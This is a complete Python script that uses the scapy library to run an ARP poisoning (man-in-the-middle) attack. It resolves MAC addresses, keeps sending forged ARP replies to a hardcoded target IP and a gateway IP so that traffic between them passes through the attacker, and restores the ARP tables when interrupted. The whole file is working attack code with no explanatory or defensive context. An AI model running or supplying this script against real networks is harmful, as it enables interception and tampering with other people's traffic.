#!/usr/bin/python3
import time
import scapy.all as scapy

class ARP_Poison():
    def mac_scan(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast = broadcast / arp_request
        ans_list = scapy.srp(arp_broadcast, timeout=5, verbose=False)[0]
        return ans_list[0][1].hwsrc

    def spoof(self, target_ip, attack_ip):
        packet = scapy.ARP(op=2, pdst=target_ip, 
                hwdst=self.mac_scan(target_ip), psrc=attack_ip)
        scapy.send(packet, verbose=False)

    def restore(self, dest_ip, source_ip):
        dest_mac = self.mac_scan(dest_ip)
        source_mac = self.mac_scan(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, 
                           psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, verbose=False)


if __name__ == "__main__":
    target_ip = "192.168.58.129"
    attack_ip = "192.168.58.1"
    attack = ARP_Poison()
    try:
        packet_count = 0
        while True:
            attack.spoof(target_ip, attack_ip)
            attack.spoof(attack_ip, target_ip)
            packet_count += 2
            print(f"\r[*] Packets Sent: {packet_count}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nExitting...")
        attack.restore(attack_ip, target_ip)
        attack.restore(target_ip, attack_ip)
        print("[!] ARP Spoofing Stopped...")

